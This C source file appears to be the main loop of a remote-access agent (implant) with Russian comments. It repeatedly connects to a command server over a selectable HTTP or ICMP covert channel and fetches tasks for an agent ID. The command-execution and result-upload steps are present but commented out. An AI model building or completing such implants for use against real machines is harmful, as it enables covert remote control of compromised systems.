#include "config.h"
#include "executable.h"
#include "transport.h"

#include <stdio.h>
#include <string.h>
//#include <stdlib.h>
#include <unistd.h>

//TODO:
//перед любым взаимодействием с сервером - INIT и в конце не забыть cleanup после каждого INIT!!!

int main() {
    #if TRANSPORT == TRANSPORT_HTTP 
        TransportModule* active_channel = &http_transport;    
    #elif TRANSPORT == TRANSPORT_ICMP
        TransportModule* active_channel = &icmp_transport;
    #elif TRANSPORT == TRANSPORT_DNS
        //TODO TransportModule* active_channel = &dns_transport;
    #else
        printf("[MAIN] Channel is unknown.\n");
        return 1;
    #endif
    
    char task_id[5] = {0};
    char command[256] = {0};
    char result[4096] = {0};

    while(1) {
        memset(command, 0, sizeof(command));
        memset(result, 0, sizeof(result));
        printf("Подключение к серверу...\n");
        if(active_channel->init() == 0) {
            printf("К серверу подключен...\n");
            if(active_channel->get_command(command, task_id,  sizeof(command), sizeof(task_id), AGENT_ID) == 0) {
                active_channel->cleanup();
                //execute_command(command, result, sizeof(result));
                //sleep(1);
                
                //Для отправки результата
                //active_channel->init();
                //active_channel->send_result(task_id, result);
                //active_channel->cleanup();
            } else {
                active_channel->cleanup();
                sleep(1);
            }
        }
        sleep(5);
    }

    return 0;
}
